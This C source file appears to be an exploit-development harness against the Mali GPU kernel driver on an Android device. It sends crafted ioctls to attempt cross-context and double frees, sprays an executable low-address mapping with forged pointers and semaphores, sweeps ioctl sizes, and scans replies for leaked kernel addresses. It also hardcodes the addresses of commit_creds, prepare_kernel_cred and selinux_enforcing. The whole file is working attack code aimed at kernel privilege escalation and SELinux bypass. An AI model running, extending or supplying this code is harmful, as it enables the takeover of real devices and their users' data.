/*
 * mali_exploit8.c — Cross-context and advanced exploitation tests
 *
 * Tests:
 * 1. Cross-context vendor free (fd A → alloc, fd B → vendor free)
 * 2. Vendor ALLOC (does it create regions differently?)
 * 3. fd swap race (close+reopen Mali fd during vendor free)
 * 4. MEM_IMPORT with controlled pointer chain at low address
 * 5. Vendor flags_change with controlled flags on active region
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

#define COMMIT_CREDS        0xc0054328
#define PREPARE_KERNEL_CRED 0xc00548e0
#define SELINUX_ENFORCING   0xc0b7ad54
#define PAGE_SIZE           4096

struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd_std(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}
static unsigned int make_cmd_vendor(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, sz);
}

static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

static int mali_alloc(int fd, uint32_t pages, uint64_t *out_gpu_va) {
    uint8_t buf[56];
    memset(buf, 0, 56);
    ((struct uk_header*)buf)->id = 512;
    *(uint64_t*)(buf + 8)  = pages;
    *(uint64_t*)(buf + 16) = pages;
    *(uint64_t*)(buf + 32) = 0xF;
    if (ioctl(fd, make_cmd_std(56), buf) < 0) return -1;
    if (((struct uk_header*)buf)->id != 0) return -1;
    *out_gpu_va = *(uint64_t*)(buf + 40);
    return 0;
}

static int mali_free_std(int fd, uint64_t gpu_va) {
    uint8_t buf[16];
    memset(buf, 0, 16);
    ((struct uk_header*)buf)->id = 516;
    *(uint64_t*)(buf + 8) = gpu_va;
    ioctl(fd, make_cmd_std(16), buf);
    return ((struct uk_header*)buf)->id;
}

static int mali_free_vendor(int fd, uint64_t gpu_va) {
    uint8_t buf[16];
    memset(buf, 0, 16);
    ((struct uk_header*)buf)->id = 516;
    *(uint64_t*)(buf + 8) = gpu_va;
    ioctl(fd, make_cmd_vendor(16), buf);
    return ((struct uk_header*)buf)->id;
}

static int read_slab(const char *name) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, name)) {
            int active;
            if (sscanf(line, "%*s %d", &active) == 1) {
                fclose(f); return active;
            }
        }
    }
    fclose(f);
    return -1;
}

/* ============================================================= */
/* TEST 1: Cross-context vendor free                              */
/* ============================================================= */
static void test1_cross_context(void) {
    fprintf(stderr, "\n=== TEST 1: Cross-context vendor free ===\n");

    int mali_a = mali_open_ctx();
    int mali_b = mali_open_ctx();
    if (mali_a < 0 || mali_b < 0) {
        fprintf(stderr, "  Cannot open contexts\n");
        return;
    }
    fprintf(stderr, "  Context A: fd=%d, Context B: fd=%d\n", mali_a, mali_b);

    /* Allocate on context A */
    uint64_t gpu_va;
    if (mali_alloc(mali_a, 1, &gpu_va) < 0) {
        fprintf(stderr, "  ALLOC on A failed\n");
        close(mali_a); close(mali_b);
        return;
    }
    fprintf(stderr, "  Allocated on A: gpu_va=0x%llx\n", (unsigned long long)gpu_va);

    /* Try to free via context B (vendor dispatch) */
    int r = mali_free_vendor(mali_b, gpu_va);
    fprintf(stderr, "  Vendor FREE via B: result=%d\n", r);

    if (r == 0) {
        fprintf(stderr, "  *** CROSS-CONTEXT FREE SUCCEEDED! ***\n");

        /* Verify: try standard free on A (should fail if B freed it) */
        int r2 = mali_free_std(mali_a, gpu_va);
        fprintf(stderr, "  Standard FREE via A after B freed: result=%d\n", r2);

        if (r2 == 0)
            fprintf(stderr, "  BOTH frees succeeded → DOUBLE FREE!\n");
        else
            fprintf(stderr, "  A's free failed → B actually freed it\n");
    } else {
        /* Context check worked — free normally */
        mali_free_std(mali_a, gpu_va);
    }

    /* Also try: alloc on B, vendor free on A */
    uint64_t gpu_va_b;
    if (mali_alloc(mali_b, 1, &gpu_va_b) == 0) {
        fprintf(stderr, "\n  Allocated on B: gpu_va=0x%llx\n", (unsigned long long)gpu_va_b);
        r = mali_free_vendor(mali_a, gpu_va_b);
        fprintf(stderr, "  Vendor FREE via A: result=%d\n", r);
        if (r == 0)
            fprintf(stderr, "  *** REVERSE CROSS-CONTEXT FREE! ***\n");
        else
            mali_free_std(mali_b, gpu_va_b);
    }

    close(mali_a);
    close(mali_b);
}

/* ============================================================= */
/* TEST 2: Vendor ALLOC                                           */
/* ============================================================= */
static void test2_vendor_alloc(int mali_fd) {
    fprintf(stderr, "\n=== TEST 2: Vendor MEM_ALLOC ===\n");

    uint8_t buf[56];
    memset(buf, 0, 56);
    ((struct uk_header*)buf)->id = 512;
    *(uint64_t*)(buf + 8)  = 1;   /* va_pages */
    *(uint64_t*)(buf + 16) = 1;   /* commit_pages */
    *(uint64_t*)(buf + 32) = 0xF; /* flags */

    int r = ioctl(mali_fd, make_cmd_vendor(56), buf);
    uint32_t result = ((struct uk_header*)buf)->id;
    uint64_t gpu_va = *(uint64_t*)(buf + 40);
    fprintf(stderr, "  Vendor ALLOC: ioctl=%d result=%u gpu_va=0x%llx\n",
            r, result, (unsigned long long)gpu_va);

    if (result == 0 && gpu_va != 0) {
        fprintf(stderr, "  *** VENDOR ALLOC WORKS! ***\n");

        /* Try standard free of vendor-allocated region */
        int r2 = mali_free_std(mali_fd, gpu_va);
        fprintf(stderr, "  Standard FREE: result=%d\n", r2);

        /* Try vendor free of vendor-allocated region */
        if (r2 != 0) {
            int r3 = mali_free_vendor(mali_fd, gpu_va);
            fprintf(stderr, "  Vendor FREE: result=%d\n", r3);
        }
    }
}

/* ============================================================= */
/* TEST 3: Vendor MEM_IMPORT low-address pointer chain            */
/* Map at mmap_min_addr and chain pointers to try code exec       */
/* ============================================================= */
static void test3_import_chain(void) {
    fprintf(stderr, "\n=== TEST 3: MEM_IMPORT pointer chain ===\n");

    /* Map at the LOWEST possible address */
    uint32_t map_addr = 0x8000;  /* mmap_min_addr = 32768 */
    size_t map_size = 0x40000;   /* 256KB */

    void *mapped = mmap((void *)(uintptr_t)map_addr, map_size,
                        PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                        -1, 0);
    if (mapped == MAP_FAILED) {
        fprintf(stderr, "  mmap at 0x%x failed: %s\n", map_addr, strerror(errno));
        return;
    }
    fprintf(stderr, "  Mapped %zuKB at %p\n", map_size/1024, mapped);

    /* Fill with self-referencing pointers + valid spinlock/sem pattern */
    uint32_t *p = (uint32_t *)mapped;
    for (size_t i = 0; i < map_size / 4; i++) {
        uint32_t addr = map_addr + i * 4;
        /* Every word is a pointer to itself — creates infinite loops
         * that don't crash but eventually time out */
        p[i] = addr;
    }

    /* Override specific offsets with useful patterns */
    /* At every 16-byte boundary: valid semaphore */
    for (size_t off = 0; off < map_size; off += 16) {
        uint32_t addr = map_addr + off;
        uint32_t *sem = (uint32_t *)((char *)mapped + off);
        sem[0] = 0;           /* spinlock unlocked */
        sem[1] = 0x7FFFFFFF;  /* count */
        sem[2] = addr + 8;    /* list_head self */
        sem[3] = addr + 8;
    }

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) { munmap(mapped, map_size); return; }

    /* Try phandle values at various offsets within our mapped region */
    fprintf(stderr, "  Testing phandle values in mapped region:\n");
    for (uint32_t phandle = map_addr; phandle < map_addr + map_size; phandle += 0x4000) {
        for (uint32_t type = 0; type <= 3; type++) {
            uint8_t buf[48];
            memset(buf, 0, 48);
            ((struct uk_header*)buf)->id = 513;
            *(uint64_t*)(buf + 8) = (uint64_t)phandle;
            *(uint32_t*)(buf + 16) = type;
            /* Set flags to various values */
            *(uint64_t*)(buf + 24) = 0xF;

            int r = ioctl(mali_fd, make_cmd_vendor(48), buf);
            uint32_t result = ((struct uk_header*)buf)->id;
            uint64_t out_va = *(uint64_t*)(buf + 32);

            if (result != 3) {
                fprintf(stderr, "  phandle=0x%x type=%u: result=%u",
                        phandle, type, result);
                if (out_va != 0)
                    fprintf(stderr, " gpu_va=0x%llx", (unsigned long long)out_va);
                fprintf(stderr, "\n");
            }
        }
    }

    /* Also try with the MEM_IMPORT phandle pointing to a real fd number */
    int ion_fd = open("/dev/ion", O_RDONLY);
    if (ion_fd >= 0) {
        struct { uint32_t len, align, heap_mask, flags; int32_t handle; }
            alloc = {4096, 4096, 1, 0, 0};
        if (ioctl(ion_fd, 0xc0144900, &alloc) == 0) {
            struct { int32_t handle, fd; } share = {alloc.handle, 0};
            if (ioctl(ion_fd, 0xc0084904, &share) == 0) {
                int dma_fd = share.fd;
                fprintf(stderr, "  Got dma_buf fd=%d\n", dma_fd);

                /* Put fd at the START of mapped region */
                p[0] = dma_fd;

                uint8_t buf[48];
                memset(buf, 0, 48);
                ((struct uk_header*)buf)->id = 513;
                *(uint64_t*)(buf + 8) = (uint64_t)map_addr;
                *(uint32_t*)(buf + 16) = 2; /* UMM */
                *(uint64_t*)(buf + 24) = 0xF;

                int r = ioctl(mali_fd, make_cmd_vendor(48), buf);
                uint32_t result = ((struct uk_header*)buf)->id;
                uint64_t out_va = *(uint64_t*)(buf + 32);
                fprintf(stderr, "  Import with real fd: result=%u", result);
                if (out_va) fprintf(stderr, " gpu_va=0x%llx", (unsigned long long)out_va);
                fprintf(stderr, "\n");

                close(dma_fd);
            }
        }
        close(ion_fd);
    }

    close(mali_fd);
    munmap(mapped, map_size);
}

/* ============================================================= */
/* TEST 4: Vendor dispatch with different ioctl sizes             */
/* Maybe specific sizes trigger different behavior                */
/* ============================================================= */
static void test4_size_sweep(int mali_fd) {
    fprintf(stderr, "\n=== TEST 4: MEM_IMPORT size sweep ===\n");

    /* Map controlled memory for phandle */
    void *mapped = mmap((void *)0x40000000, 0x10000,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (mapped == MAP_FAILED) return;
    memset(mapped, 0, 0x10000);

    uint32_t phandle = 0x40001000;

    for (uint32_t sz = 8; sz <= 128; sz += 4) {
        uint8_t buf[128];
        memset(buf, 0, 128);
        ((struct uk_header*)buf)->id = 513;
        if (sz >= 16) *(uint64_t*)(buf + 8) = (uint64_t)phandle;
        if (sz >= 20) *(uint32_t*)(buf + 16) = 2;

        int r = ioctl(mali_fd, make_cmd_vendor(sz), buf);
        int e = errno;
        uint32_t result = ((struct uk_header*)buf)->id;

        const char *note = "";
        if (r < 0 && e == 14) note = " (EFAULT)";
        else if (r < 0 && e == 22) note = " (EINVAL)";
        else if (result == 0) note = " *** SUCCESS ***";
        else if (result == 3) note = "";

        if (result != 3 || r < 0) {
            fprintf(stderr, "  size=%u: ioctl=%d errno=%d result=%u%s\n",
                    sz, r, e, result, note);
        }
    }

    munmap(mapped, 0x10000);
}

/* ============================================================= */
/* TEST 5: Explore info leak from vendor functions                */
/* Some functions might return kernel pointers in the response    */
/* ============================================================= */
static void test5_info_leak(int mali_fd) {
    fprintf(stderr, "\n=== TEST 5: Info leak probe ===\n");

    /* Allocate a region to have something to query */
    uint64_t gpu_va;
    if (mali_alloc(mali_fd, 1, &gpu_va) < 0) return;
    fprintf(stderr, "  gpu_va=0x%llx\n", (unsigned long long)gpu_va);

    /* Try MEM_QUERY via vendor with the gpu_va */
    for (uint32_t sz = 16; sz <= 64; sz += 8) {
        uint8_t buf[64];
        memset(buf, 0xCC, 64);  /* fill with 0xCC to detect writes */
        ((struct uk_header*)buf)->id = 515;  /* MEM_QUERY */
        *(uint64_t*)(buf + 8) = gpu_va;

        int r = ioctl(mali_fd, make_cmd_vendor(sz), buf);
        uint32_t result = ((struct uk_header*)buf)->id;

        if (r >= 0 && result != 515) {
            fprintf(stderr, "  MEM_QUERY size=%u: result=%u\n", sz, result);
            /* Dump response looking for kernel addresses */
            for (int i = 0; i < (int)sz; i += 4) {
                uint32_t v = *(uint32_t*)(buf + i);
                if (v != 0xCCCCCCCC && v != 0) {
                    fprintf(stderr, "    [%2d] = 0x%08x", i, v);
                    if (v >= 0xC0000000) fprintf(stderr, " ← KERNEL ADDR?");
                    fprintf(stderr, "\n");
                }
            }
        }
    }

    /* Try JOB_SUBMIT via vendor (func=529) — might leak job state */
    uint32_t funcs[] = {529, 531, 532, 533, 536, 543};
    for (int fi = 0; fi < 6; fi++) {
        uint32_t func = funcs[fi];
        uint8_t buf[64];
        memset(buf, 0xCC, 64);
        ((struct uk_header*)buf)->id = func;
        *(uint64_t*)(buf + 8) = gpu_va;

        int r = ioctl(mali_fd, make_cmd_vendor(64), buf);
        uint32_t result = ((struct uk_header*)buf)->id;

        if (r >= 0 && result == 0) {
            int has_data = 0;
            for (int i = 8; i < 64; i += 4) {
                uint32_t v = *(uint32_t*)(buf + i);
                if (v != 0xCCCCCCCC && v != 0) {
                    if (!has_data) {
                        fprintf(stderr, "  func=%u result=%u:\n", func, result);
                        has_data = 1;
                    }
                    fprintf(stderr, "    [%2d] = 0x%08x", i, v);
                    if (v >= 0xC0000000) fprintf(stderr, " ← KERNEL?");
                    fprintf(stderr, "\n");
                }
            }
        }
    }

    mali_free_std(mali_fd, gpu_va);
}

int main(int argc, char **argv) {
    fprintf(stderr, "=== Mali Advanced Exploitation ===\n");
    fprintf(stderr, "PID=%d UID=%d\n\n", getpid(), getuid());

    int test = 0;
    if (argc >= 2) test = atoi(argv[1]);

    if (test == 0 || test == 1) {
        pid_t pid = fork();
        if (pid == 0) { alarm(10); test1_cross_context(); _exit(0); }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  TEST 1 signal %d\n", WTERMSIG(status));
    }

    int mali_fd = mali_open_ctx();

    if (test == 0 || test == 2) {
        pid_t pid = fork();
        if (pid == 0) { alarm(5); test2_vendor_alloc(mali_fd); _exit(0); }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  TEST 2 signal %d\n", WTERMSIG(status));
    }

    if (test == 0 || test == 3) {
        pid_t pid = fork();
        if (pid == 0) { alarm(10); test3_import_chain(); _exit(0); }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  TEST 3 signal %d\n", WTERMSIG(status));
    }

    if (test == 0 || test == 4) {
        pid_t pid = fork();
        if (pid == 0) { alarm(5); test4_size_sweep(mali_fd); _exit(0); }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  TEST 4 signal %d\n", WTERMSIG(status));
    }

    if (test == 0 || test == 5) {
        pid_t pid = fork();
        if (pid == 0) { alarm(5); test5_info_leak(mali_fd); _exit(0); }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  TEST 5 signal %d\n", WTERMSIG(status));
    }

    if (mali_fd >= 0) close(mali_fd);
    fprintf(stderr, "\n=== Done ===\n");
    return 0;
}
